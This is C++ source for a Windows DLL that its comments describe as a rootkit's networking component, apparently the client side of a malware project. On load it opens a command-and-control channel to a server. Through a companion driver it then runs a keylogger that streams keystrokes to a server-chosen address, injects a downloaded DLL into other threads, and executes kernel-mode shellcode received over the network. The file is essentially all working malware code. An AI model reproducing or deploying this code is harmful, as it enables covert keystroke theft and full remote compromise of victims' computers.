
#include "pch.h"
#include "C2Dll.h"
#include "ParseServerCommand.h"
#include "base64.h"
#include "TempFile.h"

#include <iostream>
#include <atomic>
#include <chrono>
#include <thread>


// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")


/*
    Dll responsible for the rootkit's networking
*/

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(nullptr, 0, RunC2, nullptr, 0, nullptr);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

constexpr const CHAR* SERVER_IP = "127.0.0.1";
constexpr ULONG SERVER_PORT = 9191;

std::atomic<HANDLE> g_KeyloggingThread = 0;
std::atomic_bool g_KeyloggingThreadShouldTerminate = false;
std::atomic_bool g_KeyloggingThreadTerminated = false;

DWORD RunC2(PVOID) {
    try {
        WsaApi wsapi;
        Socket socket(SERVER_IP, SERVER_PORT);
        RootkitDriver driver;
        driver.RestoreProtectionToProcess(GetCurrentProcessId());

        while (true) {
            auto serverCommand = socket.Recv();
            std::string additionalData;
            auto cmd = ParseCommand(serverCommand, &additionalData);
            switch (cmd) {
            case StartKeylogging:
                HandleStartKeylogging(driver, additionalData, socket);
                break;
            case EndKeylogging:
                HandleEndKeylogging(driver);
                break;
            case InjectLibrary:
                HandleInjectLibrary(driver, additionalData);
                break;
            case RunKmShellcode:
                HandleRunKmShellcode(driver, additionalData, socket);
                break;
            }
        }
    }
    catch (std::exception& exception) {
        std::cout << "Failed with exception " << exception.what() << " ec=0x" << GetLastError() << std::endl;
   }
    return 1;
}

struct KeyloggingThreadContext {
    const char* Ip;
    USHORT Port;
    ULONG QueryIntervalSecs;
    RootkitDriver* Driver;
};

/*
    Sends a POST to the server detailing keylogging results.
*/
DWORD SendKeyloggingResultsToServer(PVOID Context) {
    using namespace std::this_thread;
    using namespace std::chrono;

    auto* ctx = reinterpret_cast<KeyloggingThreadContext*>(Context);
    Socket conn(ctx->Ip, ctx->Port);
    try {
        ctx->Driver->StartKeyloggging();
        while (true) {
            if (g_KeyloggingThreadShouldTerminate) {
                break;
            }
            std::string keyData = "";
            ctx->Driver->GetKeyloggingData(keyData);

            conn.Send(keyData);
            sleep_until(system_clock::now() + seconds(ctx->QueryIntervalSecs));
        }
    }
    catch (std::exception& exception) {
        std::cout << "Keylogging thread failed with error " << exception.what() << " ec=" << GetLastError() << std::endl;
        g_KeyloggingThread = 0;
    }
    g_KeyloggingThreadTerminated = true;
    return 0;
}

/*
    Parses the additional data from the keyboard message, and retrieves the ip and port to send 
    keylogging data to, and the interval to check.

    Btw:
    This is kinda vulnerable
*/
VOID ParseKeyloggingData(KeyloggingThreadContext& Context, const std::string& KeyloggingData) {
    size_t firstPos = 0, secondPos = 0;
    if ((firstPos = KeyloggingData.find('\n')) == std::string::npos) goto insufficent_data;
    Context.Ip = KeyloggingData.substr(0, firstPos - 1).c_str();

    if ((secondPos = KeyloggingData.find('\n')) == std::string::npos) goto insufficent_data;
    Context.Port = std::stoi(KeyloggingData.substr(firstPos + 1, secondPos - 1));

    Context.QueryIntervalSecs = std::stoi(KeyloggingData.substr(secondPos + 1));
    return;
 insufficent_data:
    throw std::runtime_error("Got insufficent data");
}


VOID HandleStartKeylogging(RootkitDriver& Driver, const std::string& KeyloggingData, Socket& Conn) {
    if (g_KeyloggingThread != 0) {
        return;
    }

    g_KeyloggingThreadShouldTerminate = false;
    g_KeyloggingThreadTerminated = false;

    KeyloggingThreadContext context = { 0 };
    ParseKeyloggingData(context, KeyloggingData);
    context.Driver = &Driver;

    g_KeyloggingThread = CreateThread(nullptr, 0, SendKeyloggingResultsToServer, &context, 0, nullptr);
    if (g_KeyloggingThread == 0) {
        throw std::runtime_error("Failed to create keylogging thread");
    }
}

VOID HandleEndKeylogging(RootkitDriver& Driver) {
    // wait for thread to signal termination
    g_KeyloggingThreadShouldTerminate = true;
    while (!g_KeyloggingThreadTerminated) {}
    Driver.EndKeylogging();
}

VOID ParseInjectLibraryPayload(HANDLE& Tid, std::string& Payload, const std::string& CommandParameters) {
    size_t firstPos = 0;
    if ((firstPos = CommandParameters.find('\n')) == std::string::npos) goto insufficent_data;
    Tid = UlongToHandle(std::stoi(CommandParameters.substr(0, firstPos - 1).c_str())); // yup this is terrible but its 5 AM and it works
    Payload = base64_decode(CommandParameters.substr(firstPos + 1));
    return;
insufficent_data:
    throw std::runtime_error("Got insufficent data");
}

VOID HandleInjectLibrary(RootkitDriver& Driver, const std::string& Parameters) {
    HANDLE tid;
    std::string payload;
    ParseInjectLibraryPayload(tid, payload, Parameters);

    // write dll into a temp file
    TempFile dllFile;
    if (!WriteFile(dllFile.GetHandle(), payload.c_str(), payload.size(), nullptr, nullptr)) {
        throw std::runtime_error("Failed to write to temp file");
    }

    Driver.InjectLibraryToThread(tid, dllFile.GetPath().c_str());
}


VOID ParseRunKmShellcodeParams(_Inout_ std::string& Input, _Inout_ std::string& Shellcode, _Inout_ ULONG& OutputLength, _In_ const std::string& Arguments) {
    size_t firstPos = 0, secondPos = 0;
    if ((firstPos = Arguments.find('\n')) == std::string::npos) goto insufficent_data;
    OutputLength = std::stoul(Arguments.substr(0, firstPos - 1));

    if ((secondPos = Arguments.find('\n')) == std::string::npos) goto insufficent_data;
    Input = base64_decode(Arguments.substr(0, secondPos - 1));
    Shellcode = base64_decode(Arguments.substr(secondPos + 1));
    return;
insufficent_data:
    throw std::runtime_error("Got insufficent data");
}

VOID HandleRunKmShellcode(RootkitDriver& Driver, const std::string& Parameters, Socket& Conn) {
    std::string input = "", shellcode = "";
    ULONG outputLength = 0;
    ParseRunKmShellcodeParams(input, shellcode, outputLength, Parameters);

    BYTE* output = new BYTE[outputLength];
    Driver.RunKmShellcode((KM_SHELLCODE_ROUTINE)shellcode.c_str(), shellcode.size(),
        (const PVOID)input.c_str(), input.size(), output, outputLength);
    Conn.Send(base64_encode(std::string((CHAR*)output)));
}
